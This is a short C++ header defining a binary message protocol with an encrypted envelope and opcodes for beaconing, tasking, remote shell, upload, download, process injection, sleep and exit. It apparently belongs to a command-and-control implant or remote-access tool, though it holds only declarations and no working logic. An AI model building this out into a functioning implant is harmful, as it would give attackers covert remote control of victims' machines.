#pragma once
#include <cstdint>
#include <string>
#include <vector>

namespace proto {

constexpr uint16_t kVersion = 2;
constexpr size_t   kNonceLen = 12;
constexpr size_t   kTagLen = 16;
constexpr size_t   kSessionIdLen = 16;
constexpr size_t   kMaxBody = 8 * 1024 * 1024;

enum class Op : uint8_t {
    Beacon    = 0x01,
    Result    = 0x02,
    Hello     = 0x03,
    Task      = 0x10,
    NoTask    = 0x11,
    Shell     = 0x20,
    Upload    = 0x21,
    Download  = 0x22,
    Inject    = 0x23,
    Sleep     = 0x24,
    Exit      = 0x25,
};

struct Header {
    uint16_t version = kVersion;
    uint8_t  op      = 0;
    uint8_t  status  = 0;
    uint32_t task_id = 0;
    std::string session_id;
};

struct Message {
    Header header;
    std::vector<uint8_t> payload;
};

std::vector<uint8_t> Encode(const Message& m);
bool Decode(const uint8_t* data, size_t len, Message& out);

inline size_t EnvelopeSize(size_t plain) { return kNonceLen + plain + kTagLen; }

}